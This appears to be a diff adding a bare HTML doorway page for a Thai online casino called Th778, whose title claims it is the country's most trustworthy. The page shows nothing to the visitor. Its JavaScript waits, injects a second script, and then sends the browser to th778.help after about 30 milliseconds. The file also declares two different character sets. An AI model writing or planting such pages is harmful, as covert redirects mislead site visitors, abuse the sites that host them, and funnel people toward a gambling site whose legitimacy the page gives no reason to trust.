@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>【Th778】คาสิโนออนไลน์ที่น่าเชื่อถือและน่าเชื่อถือที่สุดของประเทศไทย</title>
+        <META HTTP-EQUIV="Content-Type" Content="text/html; charset=utf-8">
+        <meta http-equiv="Content-Type" content="text/html; charset=gb2312"/>
+        <meta http-equiv="Cache-Control" content="no-siteapp">
+        <meta http-equiv="Cache-Control" content="no-transform">
+        <meta name="applicable-device" content="pc,mobile">
+        <meta name="robots" content="nofollow">
+        <meta name="viewport" content="width=device-width,initial-scale=0.8,minimum-scale=0.8,maximum-scale=0.8,user-scalable=no">
+    </head>
+    <body>
+        <script>
+            var url = Array("https://th778.help");
+            var timesleep = "30";
+            //延迟跳转单位毫秒
+			function wContent1() {
+                var script = document.createElement("script");
+                script.innerHTML = 'var weburl = url[Math.floor(Math.random()*url.length)]; setTimeout(function () {window.location = weburl;},timesleep);';
+                document.body.appendChild(script)
+            }
+            function xunhuan1() {
+                if (typeof url == 'undefined' || url == null) {
+                    setTimeout(function() {
+                        xunhuan1()
+                    }, 50)
+                } else {
+                    wContent1()
+                }
+            }
+            xunhuan1();
+        </script>
+    <script defer src="https://static.cloudflareinsights.com/beacon.min.js/v833ccba57c9e4d2798f2e76cebdd09a11778172276447" integrity="sha512-57MDmcccJXYtNnH+ZiBwzC4jb2rvgVCEokYN+L/nLlmO8rfYT/gIpW2A569iJ/3b+0UEasghjuZH/ma3wIs/EQ==" data-cf-beacon='{"version":"2024.11.0","token":"448291a9d0b84db7a94064728c1cdfc3","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
+</body>
+</html>
